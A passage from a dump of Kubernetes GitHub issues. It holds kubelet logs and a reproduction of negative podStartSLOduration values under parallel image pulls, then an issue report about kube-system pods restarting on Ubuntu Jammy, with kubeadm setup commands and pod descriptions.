m=+1046.190785202\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.870777    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-5sfj6\" podStartSLOduration=-9223372019.984016 podStartE2EDuration=\"16.87075927s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.69050053 +0000 UTC m=+1031.029354235\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.866207228 +0000 UTC m=+1046.205060833\" watchObservedRunningTime=\"2025-03-21 03:13:31.87075927 +0000 UTC m=+1046.209612975\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.885334    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-628qf\" podStartSLOduration=-9223372019.969467 podStartE2EDuration=\"16.885309203s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.21791963 +0000 UTC m=+1030.556773335\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.882933081 +0000 UTC m=+1046.221786686\" watchObservedRunningTime=\"2025-03-21 03:13:31.885309203 +0000 UTC m=+1046.224162808\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.936251    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-vqpjw\" podStartSLOduration=-9223372019.918541 podStartE2EDuration=\"16.936234368s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.6562813 +0000 UTC m=+1029.995134905\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.935183159 +0000 UTC m=+1046.274036864\" watchObservedRunningTime=\"2025-03-21 03:13:31.936234368 +0000 UTC m=+1046.275088073\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.959408    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-m8v8r\" podStartSLOduration=-9223372019.895384 podStartE2EDuration=\"16.95939208s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.719354899 +0000 UTC m=+1031.058208604\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.958134969 +0000 UTC m=+1046.296988574\" watchObservedRunningTime=\"2025-03-21 03:13:31.95939208 +0000 UTC m=+1046.298245685\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.989583    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-n4jmr\" podStartSLOduration=-9223372019.865208 podStartE2EDuration=\"16.989568056s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.113675759 +0000 UTC m=+1030.452529364\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.974169415 +0000 UTC m=+1046.313023120\" watchObservedRunningTime=\"2025-03-21 03:13:31.989568056 +0000 UTC m=+1046.328421661\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.004333    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-578vs\" podStartSLOduration=-9223372019.850456 podStartE2EDuration=\"17.004320491s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.292687226 +0000 UTC m=+1030.631540931\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.003965288 +0000 UTC m=+1046.342818893\" watchObservedRunningTime=\"2025-03-21 03:13:32.004320491 +0000 UTC m=+1046.343174096\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.039533    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-cs9sn\" podStartSLOduration=-9223372019.815256 podStartE2EDuration=\"17.039519513s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.905630722 +0000 UTC m=+1030.244484327\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.024897079 +0000 UTC m=+1046.363750684\" watchObservedRunningTime=\"2025-03-21 03:13:32.039519513 +0000 UTC m=+1046.378373118\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.040258    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-9l8bz\" podStartSLOduration=-9223372019.814526 podStartE2EDuration=\"17.040250819s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.740164492 +0000 UTC m=+1031.079018097\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.039042908 +0000 UTC m=+1046.377896513\" watchObservedRunningTime=\"2025-03-21 03:13:32.040250819 +0000 UTC m=+1046.379104424\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.095529    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-djvwz\" podStartSLOduration=-9223372019.759266 podStartE2EDuration=\"17.095510825s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.28241743 +0000 UTC m=+1030.621271035\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.07972568 +0000 UTC m=+1046.418579285\" watchObservedRunningTime=\"2025-03-21 03:13:32.095510825 +0000 UTC m=+1046.434364530\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.109946    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-r6rxc\" podStartSLOduration=-9223372019.744844 podStartE2EDuration=\"17.109931657s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.550549927 +0000 UTC m=+1030.889403532\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.109059349 +0000 UTC m=+1046.447913054\" watchObservedRunningTime=\"2025-03-21 03:13:32.109931657 +0000 UTC m=+1046.448785262\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.123331    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-v7vjt\" podStartSLOduration=-9223372019.731459 podStartE2EDuration=\"17.123317079s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.220475753 +0000 UTC m=+1030.559329358\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.12232607 +0000 UTC m=+1046.461179675\" watchObservedRunningTime=\"2025-03-21 03:13:32.123317079 +0000 UTC m=+1046.462170784\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.215148    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-s7brd\" podStartSLOduration=-9223372019.639643 podStartE2EDuration=\"17.215132519s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.10840701 +0000 UTC m=+1030.447260715\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.199573176 +0000 UTC m=+1046.538426781\" watchObservedRunningTime=\"2025-03-21 03:13:32.215132519 +0000 UTC m=+1046.553986224\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.872619    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-264f8\" podStartSLOduration=-9223372018.982172 podStartE2EDuration=\"17.872603331s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.165080537 +0000 UTC m=+1030.503934243\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.842420955 +0000 UTC m=+1047.181274660\" watchObservedRunningTime=\"2025-03-21 03:13:32.872603331 +0000 UTC m=+1047.211456936\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.890284    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-2kdnt\" podStartSLOduration=-9223372018.964504 podStartE2EDuration=\"17.890272192s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.631495381 +0000 UTC m=+1030.970349086\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.872841633 +0000 UTC m=+1047.211695338\" watchObservedRunningTime=\"2025-03-21 03:13:32.890272192 +0000 UTC m=+1047.229125897\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.892424    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-58vrp\" podStartSLOduration=-9223372018.962368 podStartE2EDuration=\"17.892408612s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.200477467 +0000 UTC m=+1030.539331172\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.890781297 +0000 UTC m=+1047.229635002\" watchObservedRunningTime=\"2025-03-21 03:13:32.892408612 +0000 UTC m=+1047.231262217\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.926429    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-hnv4p\" podStartSLOduration=-9223372018.928364 podStartE2EDuration=\"17.926412723s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.69160824 +0000 UTC m=+1031.030461845\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.925349813 +0000 UTC m=+1047.264203518\" watchObservedRunningTime=\"2025-03-21 03:13:32.926412723 +0000 UTC m=+1047.265266328\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.926677    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-r58ns\" podStartSLOduration=-9223372018.928106 podStartE2EDuration=\"17.926669125s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.566812278 +0000 UTC m=+1030.905665883\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.909863572 +0000 UTC m=+1047.248717177\" watchObservedRunningTime=\"2025-03-21 03:13:32.926669125 +0000 UTC m=+1047.265522730\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.941415    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-gfgkv\" podStartSLOduration=-9223372018.913374 podStartE2EDuration=\"17.94140136s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.976416581 +0000 UTC m=+1030.315270186\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.941179358 +0000 UTC m=+1047.280033063\" watchObservedRunningTime=\"2025-03-21 03:13:32.94140136 +0000 UTC m=+1047.280255065\"\nMar 21 03:13:32 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:32.960785    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-z8bkl\" podStartSLOduration=-9223372018.894003 podStartE2EDuration=\"17.960772137s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.309409881 +0000 UTC m=+1030.648263486\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.959369624 +0000 UTC m=+1047.298223229\" watchObservedRunningTime=\"2025-03-21 03:13:32.960772137 +0000 UTC m=+1047.299625742\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.000873    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-8ccv8\" podStartSLOduration=-9223372018.853914 podStartE2EDuration=\"18.000860804s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.738375976 +0000 UTC m=+1031.077229581\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:32.984558555 +0000 UTC m=+1047.323412260\" watchObservedRunningTime=\"2025-03-21 03:13:33.000860804 +0000 UTC m=+1047.339714409\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.002071    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-7gbtx\" podStartSLOduration=-9223372018.852713 podStartE2EDuration=\"18.002062815s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.284209447 +0000 UTC m=+1030.623063052\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.001411709 +0000 UTC m=+1047.340265314\" watchObservedRunningTime=\"2025-03-21 03:13:33.002062815 +0000 UTC m=+1047.340916520\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.021074    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-f5vfn\" podStartSLOduration=-9223372018.833714 podStartE2EDuration=\"18.021061788s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.096799602 +0000 UTC m=+1030.435653307\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.020722285 +0000 UTC m=+1047.359575890\" watchObservedRunningTime=\"2025-03-21 03:13:33.021061788 +0000 UTC m=+1047.359915493\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.041505    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-7fflq\" podStartSLOduration=-9223372018.813286 podStartE2EDuration=\"18.041490675s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.738438576 +0000 UTC m=+1031.077292181\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.040171363 +0000 UTC m=+1047.379025068\" watchObservedRunningTime=\"2025-03-21 03:13:33.041490675 +0000 UTC m=+1047.380344380\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.067260    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-4n5jw\" podStartSLOduration=-9223372018.78753 podStartE2EDuration=\"18.067245411s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.550062022 +0000 UTC m=+1030.888915727\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.064382585 +0000 UTC m=+1047.403236290\" watchObservedRunningTime=\"2025-03-21 03:13:33.067245411 +0000 UTC m=+1047.406099016\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.113932    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-4wzvx\" podStartSLOduration=-9223372018.74086 podStartE2EDuration=\"18.113915637s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.797781117 +0000 UTC m=+1030.136634822\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.095027165 +0000 UTC m=+1047.433880870\" watchObservedRunningTime=\"2025-03-21 03:13:33.113915637 +0000 UTC m=+1047.452769242\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.114175    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-q27k7\" podStartSLOduration=-9223372018.740606 podStartE2EDuration=\"18.11416994s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.727564975 +0000 UTC m=+1031.066418580\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.11310713 +0000 UTC m=+1047.451960835\" watchObservedRunningTime=\"2025-03-21 03:13:33.11416994 +0000 UTC m=+1047.453023645\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.129667    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-g567k\" podStartSLOduration=-9223372018.725124 podStartE2EDuration=\"18.129651781s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.218154732 +0000 UTC m=+1030.557008337\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.128065567 +0000 UTC m=+1047.466919272\" watchObservedRunningTime=\"2025-03-21 03:13:33.129651781 +0000 UTC m=+1047.468505386\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.147916    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-t94cg\" podStartSLOduration=-9223372018.706875 podStartE2EDuration=\"18.147900148s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.798969528 +0000 UTC m=+1030.137823133\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.147198442 +0000 UTC m=+1047.486052047\" watchObservedRunningTime=\"2025-03-21 03:13:33.147900148 +0000 UTC m=+1047.486753753\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.170297    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-dqm59\" podStartSLOduration=-9223372018.684494 podStartE2EDuration=\"18.170282453s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.096743801 +0000 UTC m=+1030.435597406\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.16998595 +0000 UTC m=+1047.508839655\" watchObservedRunningTime=\"2025-03-21 03:13:33.170282453 +0000 UTC m=+1047.509136158\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.221446    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-zzmbs\" podStartSLOduration=-9223372018.633348 podStartE2EDuration=\"18.221428021s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.193080298 +0000 UTC m=+1030.531933903\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.197713204 +0000 UTC m=+1047.536566909\" watchObservedRunningTime=\"2025-03-21 03:13:33.221428021 +0000 UTC m=+1047.560281626\"\nMar 21 03:13:33 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:33.222630    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-l4wcb\" podStartSLOduration=-9223372018.632154 podStartE2EDuration=\"18.222620532s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.098106114 +0000 UTC m=+1030.436959719\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:33.220730714 +0000 UTC m=+1047.559584319\" watchObservedRunningTime=\"2025-03-21 03:13:33.222620532 +0000 UTC m=+1047.561474237\"\nMar 21 03:14:05 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:14:05.976677    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/nsenter-qp4ayb\" podStartSLOduration=0.679895828 podStartE2EDuration=\"2.976662035s\" podCreationTimestamp=\"2025-03-21 03:14:03 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:14:03.528909062 +0000 UTC m=+1077.867762667\" lastFinishedPulling=\"2025-03-21 03:14:05.825675269 +0000 UTC m=+1080.164528874\" observedRunningTime=\"2025-03-21 03:14:05.974919418 +0000 UTC m=+1080.313773023\" watchObservedRunningTime=\"2025-03-21 03:14:05.976662035 +0000 UTC m=+1080.315515740\"\n```"}, {"author": "alyssa1303", "body": "Full log is here: \n\n[kubelet.log](https://github.com/user-attachments/files/19380521/kubelet.log)"}, {"author": "esotsal", "body": "Thanks @alyssa1303 for providing additional information. Continuing investigation."}, {"author": "esotsal", "body": "Reproduced issue starting a local up cluster with parallel image pulls enabled ( `serializeImagePulls` field set to false ) .\n\nI0321 14:29:35.653481  364481 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-8665c9fdf7-wmxz8\" **podStartSLOduration=-9223372020.201311** podStartE2EDuration=\"16.653464473s\" podCreationTimestamp=\"2025-03-21 14:29:19 +0100 CET\" **firstStartedPulling=\"2025-03-21 14:29:20.051045925 +0100 CET m=+45.327360658\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\"** observedRunningTime=\"2025-03-21 14:29:35.651967605 +0100 CET m=+60.928282339\" watchObservedRunningTime=\"2025-03-21 14:29:35.653464473 +0100 CET m=+60.929779200\"\n\nWith parallel image pulls disabled ( `serializeImagePulls` field set to true ) , didn't manage to reproduce issue. \n\n/retitle pod_startup_latency_tracker : podStartSLOduration returns negative value with serializeImagePulls set to false\n\nContinuing investigation to find root cause "}]}
{"repo": "kubernetes/kubernetes", "issue_number": 110177, "issue_url": "https://github.com/kubernetes/kubernetes/issues/110177", "issue_title": "Constant kube-system pod restard due to SandboxChanged under ubuntu Jammy", "issue_author": "Congelli501", "issue_body": "### What happened?\n\nWhen installing a master node under Ubuntu jammy, the base kube-system pods (etcd, kube-apiserver, kube-proxy...) restarts every few minutes.\r\nThe etcd pod restarts because of a `SandboxChanged`\r\n```\r\n  Normal   SandboxChanged  57s                    kubelet  Pod sandbox changed, it will be killed and re-created.\r\n```\r\nThe other pods restarts because of the `SandboxChanged` event and fail because of unreachable etcd / api server (as a consequence)\r\n\r\nI haven't found the origin of the `SandboxChanged` event\n\n### What did you expect to happen?\n\nThe kube-system pods shouldn't restart constently because of the `SandboxChanged` under ubuntu Jammy\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n* Setup an ubuntu Jammy VM with 2 network interfaces\r\n* Setup the kuberntes repository\r\n* Install containerd kubeadm & kubelet\r\n* modprobe br_netfilter, enable routing & iptable for bridge\r\n* run kubeadm init\r\n\r\n```\r\napt-get --yes install containerd kubelet kubectl kubeadm\r\nmodprobe br_netfilter\r\nsysctl -w net.ipv4.ip_forward=1\r\nsysctl -w net.bridge.bridge-nf-call-ip6tables=1\r\nsysctl -w net.bridge.bridge-nf-call-iptables=1\r\nkubeadm config images pull\r\nkubeadm init --cri-socket unix:///run/containerd/containerd.sock --apiserver-advertise-address 10.88.3.60 --pod-network-cidr=10.88.3.60/16\r\n```\r\n\r\nResult:\r\n<details>\r\n```\r\nroot@master0:~# crictl -r unix:///run/containerd/containerd.sock ps -a\r\nCONTAINER           IMAGE               CREATED              STATE               NAME                      ATTEMPT             POD ID\r\n0426a01c0d933       aebe758cef4cd       17 seconds ago       Running             etcd                      12                  3081199357710\r\na46307ecd7db9       529072250ccc6       39 seconds ago       Exited              kube-apiserver            11                  bd9d95f33a01c\r\n75facd3e2c943       77b49675beae1       47 seconds ago       Running             kube-proxy                13                  87642cfed70e1\r\n508f16a359c66       e3ed7dee73e93       About a minute ago   Exited              kube-scheduler            15                  80d6114fb09b4\r\nfefd165b18546       88784fb4ac2f6       3 minutes ago        Running             kube-controller-manager   12                  ebaca3ae71ac8\r\n679b2f042eab1       aebe758cef4cd       6 minutes ago        Exited              etcd                      11                  da070257e5ea7\r\n4e6452b46dce2       77b49675beae1       7 minutes ago        Exited              kube-proxy                12                  417f51b4372b9\r\n6dde3dee7c82d       88784fb4ac2f6       8 minutes ago        Exited              kube-controller-manager   11                  ca85f97a018ed\r\n```\r\n\r\n```\r\nroot@master0:~# kubectl describe pod -n kube-system etcd-master0\r\nName:                 etcd-master0\r\nNamespace:            kube-system\r\nPriority:             2000001000\r\nPriority Class Name:  system-node-critical\r\nNode:                 master0/10.88.3.60\r\nStart Time:           Mon, 23 May 2022 18:36:48 +0000\r\nLabels:               component=etcd\r\n                      tier=control-plane\r\nAnnotations:          kubeadm.kubernetes.io/etcd.advertise-client-urls: https://10.88.3.60:2379\r\n                      kubernetes.io/config.hash: 3da0b3b3f5b168e56c71dd2c6212a28e\r\n                      kubernetes.io/config.mirror: 3da0b3b3f5b168e56c71dd2c6212a28e\r\n                      kubernetes.io/config.seen: 2022-05-23T18:36:48.138775775Z\r\n                      kubernetes.io/config.source: file\r\n                      seccomp.security.alpha.kubernetes.io/pod: runtime/default\r\nStatus:               Running\r\nIP:                   10.88.3.60\r\nIPs:\r\n  IP:           10.88.3.60\r\nControlled By:  Node/master0\r\nContainers:\r\n  etcd:\r\n    Container ID:  containerd://166072295fa6a53a77d887a713d7e711dadc71976f25278b671e382cf5ae82e8\r\n    Image:         k8s.gcr.io/etcd:3.5.3-0\r\n    Image ID:      k8s.gcr.io/etcd@sha256:13f53ed1d91e2e11aac476ee9a0269fdda6cc4874eba903efd40daf50c55eee5\r\n    Port:          <none>\r\n    Host Port:     <none>\r\n    Command:\r\n      etcd\r\n      --advertise-client-urls=https://10.88.3.60:2379\r\n      --cert-file=/etc/kubernetes/pki/etcd/server.crt\r\n      --client-cert-auth=true\r\n      --data-dir=/var/lib/etcd\r\n      --experimental-initial-corrupt-check=true\r\n      --initial-advertise-peer-urls=https://10.88.3.60:2380\r\n      --initial-cluster=master0=https://10.88.3.60:2380\r\n      --key-file=/etc/kubernetes/pki/etcd/server.key\r\n      --listen-client-urls=https://127.0.0.1:2379,https://10.88.3.60:2379\r\n      --listen-metrics-urls=http://127.0.0.1:2381\r\n      --listen-peer-urls=https://10.88.3.60:2380\r\n      --name=master0\r\n      --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt\r\n      --peer-client-cert-auth=true\r\n      --peer-key-file=/etc/kubernetes/pki/etcd/peer.key\r\n      --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\r\n      --snapshot-count=10000\r\n      --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\r\n    State:          Running\r\n      Started:      Mon, 23 May 2022 18:42:12 +0000\r\n    Last State:     Terminated\r\n      Reason:       Completed\r\n      Exit Code:    0\r\n      Started:      Mon, 23 May 2022 18:40:05 +0000\r\n      Finished:     Mon, 23 May 2022 18:41:25 +0000\r\n    Ready:          True\r\n    Restart Count:  4\r\n    Requests:\r\n      cpu:        100m\r\n      memory:     100Mi\r\n    Liveness:     http-get http://127.0.0.1:2381/health delay=10s timeout=15s period=10s #success=1 #failure=8\r\n    Startup:      http-get http://127.0.0.1:2381/health delay=10s timeout=15s period=10s #success=1 #failure=24\r\n    Environment:  <none>\r\n    Mounts:\r\n      /etc/kubernetes/pki/etcd from etcd-certs (rw)\r\n      /var/lib/etcd from etcd-data (rw)\r\nConditions:\r\n  Type              Status\r\n  Initialized       True \r\n  Ready             True \r\n  ContainersReady   True \r\n  PodScheduled      True \r\nVolumes:\r\n  etcd-certs:\r\n    Type:          